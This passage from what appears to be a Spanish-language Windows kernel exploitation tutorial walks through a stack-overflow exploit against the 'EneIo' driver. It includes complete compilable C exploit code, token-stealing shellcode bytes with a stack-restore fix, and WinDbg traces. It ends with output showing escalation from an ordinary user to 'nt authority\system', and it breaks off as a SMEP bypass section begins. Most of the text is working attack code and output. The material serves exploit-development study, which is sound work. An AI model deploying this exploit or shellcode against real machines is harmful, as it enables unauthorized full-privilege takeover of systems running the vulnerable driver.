<p class="plain-text">Sabemos que después de rellenar <code class="language-plaintext highlighter-rouge">56</code> bytes tenemos la dirección de retorno, entonces reservaremos un nuevo espacio llamado <code class="language-plaintext highlighter-rouge">shellcode</code> donde copiaremos un total de <code class="language-plaintext highlighter-rouge">64 C's</code>, luego el puntero a shellcode lo copiaremos a payload después de <code class="language-plaintext highlighter-rouge">56</code> A's por lo que el controlador deberia intentar ejecutar las <code class="language-plaintext highlighter-rouge">C's</code> en el <code class="language-plaintext highlighter-rouge">ret</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>

</span><span class="o">#define</span><span class="na"> IOCTL_STACK_OVERFLOW </span><span class="mi">0x80102040
</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">EneIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(NULL,</span><span class="mi"> 64</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(NULL,</span><span class="mi"> 64</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload,</span><span class="mi"> 56</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);
    RtlFillMemory(shellcode,</span><span class="mi"> 64</span><span class="p">,</span><span class="s"> 'C'</span><span class="p">);

    </span><span class="o">*</span><span class="p">((</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">) ((</span><span class="na">BYTE </span><span class="o">*</span><span class="p">) payload </span><span class="o">+</span><span class="mi"> 56</span><span class="p">)) </span><span class="o">= </span><span class="p">(</span><span class="na">QWORD</span><span class="p">) shellcode;

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload,</span><span class="mi"> 64</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos el exploit y ahora la dirección de retorno apunta a <code class="language-plaintext highlighter-rouge">0x223877d0000</code>, esta dirección contiene las <code class="language-plaintext highlighter-rouge">C's</code> por lo que se intentarán ejecutar como instrucciones.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
ene+0x14b8:
fffff801`294b14b8 c3              ret
  
</span><span class="ro">0: kd></span><span class="p"> db poi(rsp) L40
00000223`877d0000  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
00000223`877d0010  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
00000223`877d0020  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
00000223`877d0030  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC

</span><span class="ro">0: kd></span><span class="p"> p
00000223`877d0000 43              ???</span>
</code></pre></div></div><br>

</section>
<section class="post" id="exploit">
<br><h3 class="post-title">Initial Exploit</h3><br>

<p class="plain-text">Ya que podemos ejecutar un <code class="language-plaintext highlighter-rouge">shellcode</code> entonces utilizaremos un <a href="/exploit-development/windows-kernel/kernel-shellcode#token-stealing">token stealing</a>, este shellcode esta diseñado para tomar el token del proceso <code class="language-plaintext highlighter-rouge">System</code> y copiarlo a nuestro proceso actual por lo vamos a obtener sus privilegios, al ejecutarlo simplemente llamaremos a <code class="language-plaintext highlighter-rouge">system("cmd.exe");</code> para obtener una shell con todos los privilegios.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>

</span><span class="o">#define </span><span class="na">IOCTL_STACK_OVERFLOW</span><span class="mi"> 0x80102040
</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

BYTE</span><span class="p"> tokenStealing[</span><span class="mi">60</span><span class="p">]</span><span class="o"> =</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    </span><span class="mi">0x50</span><span class="p">,</span><span class="mi"> 0x5b</span><span class="p">,</span><span class="c1">                                           // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    </span><span class="mi">0xc3</span><span class="c1">                                                  // ret                              ; return
</span><span class="p">};

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">EneIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 64</span><span class="p">, MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="o"> sizeof</span><span class="p">(tokenStealing), MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload,</span><span class="mi"> 56</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);
    RtlCopyMemory(shellcode, tokenStealing,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));

    </span><span class="o">*</span><span class="p">((</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">) ((</span><span class="na">BYTE </span><span class="o">*</span><span class="p">) payload </span><span class="o">+</span><span class="mi"> 56</span><span class="p">)) </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload,</span><span class="mi"> 64</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora al llegar al <code class="language-plaintext highlighter-rouge">ret</code> tomará como dirección de retorno nuestro token stealing que en caso de ser ejecutado nos asignará todos los privilegios del proceso <code class="language-plaintext highlighter-rouge">System</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
ene+0x14b8:
fffff802`826314b8 c3              ret

</span><span class="ro">0: kd></span><span class="p"> u poi(rsp) L0xc
00000286`4a8c0000 65488b142588010000 mov     rdx,qword ptr gs:[188h]
00000286`4a8c0009 488b82b8000000     mov     rax,qword ptr [rdx+0B8h]
00000286`4a8c0010 50                 push    rax
00000286`4a8c0011 5b                 pop     rbx
00000286`4a8c0012 488b9b48040000     mov     rbx,qword ptr [rbx+448h]
00000286`4a8c0019 4881eb48040000     sub     rbx,448h
00000286`4a8c0020 4883bb4004000004   cmp     qword ptr [rbx+440h],4
00000286`4a8c0028 75e8               jne     00000286`4a8c0012
00000286`4a8c002a 488b8bb8040000     mov     rcx,qword ptr [rbx+4B8h]
00000286`4a8c0031 80e1f0             and     cl,0F0h
00000286`4a8c0034 488988b8040000     mov     qword ptr [rax+4B8h],rcx
00000286`4a8c003b c3                 ret</span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos un problema, cuando terminamos de ejecutar el todo el shellcode y llegamos al <code class="language-plaintext highlighter-rouge">ret</code>, como sobrescribimos la dirección de retorno donde originalmente ibamos a volver va a intentar retornar a otro qword que es <code class="language-plaintext highlighter-rouge">0x2</code> y provocará un error.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> p
00000286`4a8c0000 65488b142588010000 mov   rdx,qword ptr gs:[188h]

</span><span class="ro">0: kd></span><span class="p"> pt
00000286`4a8c003b c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L1
fffffd89`f360d7f0  00000000`00000002

</span><span class="ro">0: kd></span><span class="p"> p
00000000`00000002 ??              ???</span>
</code></pre></div></div><br>

<p class="plain-text">Si retornamos a esa dirección inválida el kernel corrompe por lo que nos manda un BSOD de tipo <a href="https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0x139--kernel-security-check-failure">KERNEL_SECURITY_CHECK_FAILURE</a> el cual nos indica que el stack está corrupto y no puede continuar porque puede significar una falla de seguridad.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Break instruction exception - code 80000003 (first chance)
nt!KeCheckStackAndTargetAddress+0x53:
fffff802`7dd097d3 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> g
KDTARGET: Refreshing KD connection
*** Fatal System Error: 0x00000139 (0x0000000000000000,0x0000000000000000,0x0000000000000000,0x0000000000000002)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff802`7de06f80 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

KERNEL_SECURITY_CHECK_FAILURE (139)
A kernel component has corrupted a critical data structure. The corruption could potentially allow a malicious user to gain control of this machine.
Arguments:
Arg1: 0000000000000000, A stack-based buffer has been overrun.
Arg2: 0000000000000000, Address of the trap frame for the exception that caused the BugCheck
Arg3: 0000000000000000, Address of the exception record for the exception that caused the BugCheck
Arg4: 0000000000000002, Reserved</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-kernel/stack-overflow/9.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/9.png"></p></div></a>

<p class="plain-text">Para evitar esto lo que haremos será mover el stack para que retorne a una dirección que haga que salga correctamente, podemos usar la de <code class="language-plaintext highlighter-rouge">IopSynchronousServiceTail</code>, esta es parte del gestor <code class="language-plaintext highlighter-rouge">I/O Manager</code> de Windows y es tipicamente la que llama a la función <code class="language-plaintext highlighter-rouge">DeviceIoControl</code>, si retornamos aquí el sitema operativo creerá que la operación se completó y retornará la ejecución al modo usuario de forma normal.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
ene+0x14b8:
fffff803`88e614b8 c3              ret

</span><span class="ro">0: kd></span><span class="p"> pt
0000020f`af27003b c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp
fffffe0e`440147f0  00000000`00000002
fffffe0e`440147f8  fffff803`843b418e nt!ExAllocatePoolWithTag+0x2e
fffffe0e`44014800  ffffc88d`75171660
fffffe0e`44014808  ffffc88d`75171660
fffffe0e`44014810  00000000`00000000
fffffe0e`44014818  00000000`00000001
fffffe0e`44014820  ffffc88d`751f78b0
fffffe0e`44014828  fffff803`8404c801 nt!IopSynchronousServiceTail+0x361
fffffe0e`44014830  fffffe0e`44014b80
fffffe0e`44014838  00000000`80102040
fffffe0e`44014840  ffffc88d`75171660
fffffe0e`44014848  fffff803`00000000
fffffe0e`44014850  00000000`00000000
fffffe0e`44014858  fffff803`83c09c01 nt!MiValidFault+0x4f1
fffffe0e`44014860  ffffc88d`75171660
fffffe0e`44014868  00000000`00000000</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces es simple, añadimos <code class="language-plaintext highlighter-rouge">0x38</code> al stack para que en el <code class="language-plaintext highlighter-rouge">ret</code> ahora apunte a la dirección que sale usando el retorno de la función <code class="language-plaintext highlighter-rouge">IopSynchronousServiceTail</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ asm </span><span class="p">-c amd64 </span><span class="am">'add rsp, 0x38'</span><span class="p">
4883c438</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xc4</span><span class="p">,</span><span class="mi"> 0x38</span><span class="p">,</span><span class="c1">        // add rsp, 0x38        ; restore stack
</span><span class="mi">0xc3</span><span class="c1">                           // ret                  ; return</span>
</code></pre></div></div><br>

<p class="plain-text">Si volvemos a correr el exploit podemos ver que luego de ejecutar nuestro shellcode retorna a la salida de la función que queremos y la ejecución continúa sin corromper.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
ene+0x14b8:
fffff800`2c8214b8 c3              ret

</span><span class="ro">0: kd></span><span class="p"> pt
00000268`146e003f c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L1
ffffa402`61972828  fffff800`2664c801 nt!IopSynchronousServiceTail+0x361

</span><span class="ro">0: kd></span><span class="p"> g
Debuggee is running...</span>
</code></pre></div></div><br>

<p class="plain-text">Resumiendo el exploit, rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta antes de la dirección de retorno, aquí escribimos la dirección de nuestro shellcode que robará el token del proceso <code class="language-plaintext highlighter-rouge">System</code> y luego de limpiar el stack retorna al modo de usuario, después de explotar la vulnerabilidad y robar el token ejecutamos una <code class="language-plaintext highlighter-rouge">cmd.exe</code> para obtener una shell.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>

</span><span class="o">#define </span><span class="na">IOCTL_STACK_OVERFLOW</span><span class="mi"> 0x80102040
</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

BYTE</span><span class="p"> tokenStealing[</span><span class="mi">64</span><span class="p">]</span><span class="o"> =</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    </span><span class="mi">0x50</span><span class="p">,</span><span class="mi"> 0x5b</span><span class="p">,</span><span class="c1">                                           // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xc4</span><span class="p">,</span><span class="mi"> 0x38</span><span class="p">,</span><span class="c1">                               // add rsp, 0x38                    ; restore stack
    </span><span class="mi">0xc3</span><span class="c1">                                                  // ret                              ; return
</span><span class="p">};

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">EneIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 64</span><span class="p">, MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="o"> sizeof</span><span class="p">(tokenStealing), MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload,</span><span class="mi"> 56</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);
    RtlCopyMemory(shellcode, tokenStealing,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));

    </span><span class="o">*</span><span class="p">((</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">) ((</span><span class="na">BYTE </span><span class="o">*</span><span class="p">) payload </span><span class="o">+</span><span class="mi"> 56</span><span class="p">)) </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload,</span><span class="mi"> 64</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit deberiamos pasar de la shell como el usuario llamado <code class="language-plaintext highlighter-rouge">user</code> con pocos privilegios a <code class="language-plaintext highlighter-rouge">nt authority\system</code> que es el usuario con máximos privilegios.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.6456]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

<section class="post" id="smep">
<br><h3 class="post-title">SMEP Bypass</h3><br>

<p class="plain-text">A menudo Windows implementa soluciones para evitar que una vulnerabilidad sea crítica y que de existir no se pueda explotar o al menos no sea fácil, aquí es donde nace <code class="language-plaintext highlighter-rouge">SMEP</code>, una protección que impide ejecutar código en memoria de usuario si se ejecuta desde modo kernel, a continuación entenderemos su funcionamiento.</p>
<p class="plain-text">Cuando ejecutamos el <a href="/exploit-development/windows-kernel/stack-overflow">exploit</a> y sobrescribimos la dirección de retorno intenta saltar a nuestro shellcode, lo importante aqui es que nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> está reservado en memoria de usuario, ya que estamos en modo kernel al intentar ejecutar la memoria de usuario nos saltará la protección <code class="language-plaintext highlighter-rouge">SMEP</code> impidiendo así que este se ejecute.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">bp ene + 0x14b8

</span><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
ene+0x14b8:
fffff803`7da614b8 c3                 ret

</span><span class="ro">0: kd></span><span class="p"> u poi(rsp) L0xd
00000213`f7740000 65488b142588010000 mov     rdx,qword ptr gs:[188h]
00000213`f7740009 488b82b8000000     mov     rax,qword ptr [rdx+0B8h]
00000213`f7740010 50                 push    rax
00000213`f7740011 5b                 pop     rbx
00000213`f7740012 488b9b48040000     mov     rbx,qword ptr [rbx+448h]
00000213`f7740019 4881eb48040000     sub     rbx,448h
00000213`f7740020 4883bb4004000004   cmp     qword ptr [rbx+440h],4
00000213`f7740028 75e8               jne     00000213`f7740012
00000213`f774002a 488b8bb8040000     mov     rcx,qword ptr [rbx+4B8h]
00000213`f7740031 80e1f0             and     cl,0F0h
00000213`f7740034 488988b8040000     mov     qword ptr [rax+4B8h],rcx
00000213`f774003b 4883c438           add     rsp,38h
00000213`f774003f c3                 ret</span>
</code></pre></div></div><br>

<p class="plain-text">En el exploit anterior logramos ejecutar el shellcode ya que se deshabilitó <code class="language-plaintext highlighter-rouge">SMEP</code>, prácticamente todos los procesadores actuales tienen soporte y se encuentra activado por defecto, al ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> e interpretar la primera instrucción del shellcode lanza <code class="language-plaintext highlighter-rouge">BSOD</code> tipo <a href="https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0xfc---attempted-execute-of-noexecute-memory">ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY</a>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">p
00000213`f7740000 65488b142588010000 mov   rdx,qword ptr gs:[188h]

</span><span class="ro">0: kd></span><span class="p"> p
KDTARGET: Refreshing KD connection
*** Fatal System Error: 0x000000fc (0x00000213F7740000,0x00000001A6AFB867,0xFFFFFE0526456660,0x0000000080000005)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff803`76a06f80 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> !analyze -v
